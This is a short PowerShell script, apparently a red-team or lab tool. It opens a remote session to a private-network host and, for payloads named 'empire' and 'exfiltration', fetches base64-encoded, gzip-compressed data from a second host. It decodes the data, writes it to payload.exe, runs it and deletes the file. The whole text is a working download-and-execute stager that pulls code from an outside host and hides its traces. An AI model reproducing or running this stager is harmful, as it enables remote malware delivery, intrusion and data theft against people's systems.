$session = New-PSSession -HostName 192.168.1.216 -UserName rajeev
Invoke-Command $session -ScriptBlock {
    $payloads = @('empire', 'exfiltration')
    foreach ( $payload in $payloads ){
        $fetched_data = Invoke-RestMethod -Uri "http://192.168.1.205:9000/$payload.json"
        $parsedBase64payload = [System.Convert]::FromBase64String($fetched_data.payloadContent)
        $initialMemoryStream = New-Object System.IO.MemoryStream
        $initialMemoryStream.Write($parsedBase64payload, 0, $parsedBase64payload.Length)
        $initialMemoryStream.Seek(0,0) | Out-Null
        $decompressed_binary = New-Object System.IO.BinaryReader(New-Object System.IO.Compression.GZipStream($initialMemoryStream, [System.IO.Compression.CompressionMode]::Decompress))
        $decompressed_binary_bytes = $decompressed_binary.ReadBytes($fetched_data.payloadSize)
        $filename = ".\payload.exe"
        Set-Content -AsByteStream -Path $filename -Value $decompressed_binary_bytes
        Invoke-Expression "& $filename"
        Remove-Item $filename
    }
}